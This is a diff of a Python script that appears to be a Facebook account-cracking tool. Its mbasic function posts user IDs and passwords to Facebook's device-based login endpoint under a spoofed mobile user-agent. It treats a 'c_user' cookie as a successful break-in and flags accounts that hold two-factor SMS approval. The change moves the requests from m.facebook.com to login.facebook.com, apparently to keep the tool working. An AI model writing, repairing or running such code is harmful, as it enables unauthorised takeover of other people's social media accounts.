@@ -1280,7 +1280,7 @@ def mbasic(uid,pwx,tl):
             "pass":pw,
             "login":"Log In"}
             headers = {
-            'authority': 'm.facebook.com',
+            'authority': 'login.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
@@ -1297,7 +1297,7 @@ def mbasic(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://login.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
